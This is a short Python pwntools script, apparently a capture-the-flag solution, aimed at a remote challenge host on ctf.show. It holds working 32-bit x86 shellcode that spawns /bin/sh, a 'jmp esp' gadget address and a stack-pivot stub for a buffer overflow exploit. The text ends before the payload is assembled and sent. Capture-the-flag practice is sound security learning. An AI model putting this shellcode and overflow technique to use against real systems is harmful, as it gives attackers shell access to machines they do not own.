from pwn import *
context.log_level = "debug"
#io = process('./pwn')
io = remote('pwn.challenge.ctf.show',28165)
shellcode_x86  = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"
shellcode_x86 += "\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"
shellcode_x86 += "\x0b\xcd\x80"
jmp_esp = 0x08048d17  # 0x08048d17 : jmp esp
sub_esp_jmp = asm("sub esp,0x28;jmp esp")
